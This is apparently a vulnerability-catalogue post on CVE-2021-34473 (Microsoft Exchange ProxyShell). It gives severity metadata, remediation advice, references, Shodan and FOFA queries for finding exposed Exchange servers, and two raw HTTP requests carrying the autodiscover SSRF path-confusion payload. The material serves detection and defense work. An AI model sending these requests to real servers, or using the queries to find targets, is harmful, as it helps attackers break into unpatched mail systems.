---
layout: post
cve_id: CVE-2021-34473
title: Exchange Server - Remote Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-34473.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-34473.yaml
snort2_rule: N/A
snort3_rule: N/A
author: arcc,intx0x80,dwisiswant0,r3dg33k
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the affected Exchange Server, potentially leading to a
  complete compromise of the system.

  '
remediation: Apply Microsoft Exchange Server 2019 Cumulative Update 9 or upgrade to
  the latest version.
reference:
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473
- https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
- https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
- https://nvd.nist.gov/vuln/detail/CVE-2021-34473
- https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-34473
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
  cvss-score: 9.1
  cve-id: CVE-2021-34473
  cwe-id: CWE-918
  epss-score: 0.9423
  epss-percentile: 0.99921
  cpe: cpe:2.3:a:microsoft:exchange_server:2013:cumulative_update_23:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: microsoft
  product: exchange_server
  shodan-query:
  - vuln:cve-2021-26855
  - http.favicon.hash:1768726119
  - http.title:"outlook"
  - cpe:"cpe:2.3:a:microsoft:exchange_server"
  fofa-query:
  - title="outlook"
  - icon_hash=1768726119
  google-query: intitle:"outlook"
tags:
- cve2021
- cve
- ssrf
- rce
- exchange
- kev
- microsoft
- vkev
- vuln
---

## üîç Vulnerability Description
Microsoft Exchange Server is vulnerable to a remote code execution vulnerability. This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.


## üåê HTTP Request
```nohighlight
GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

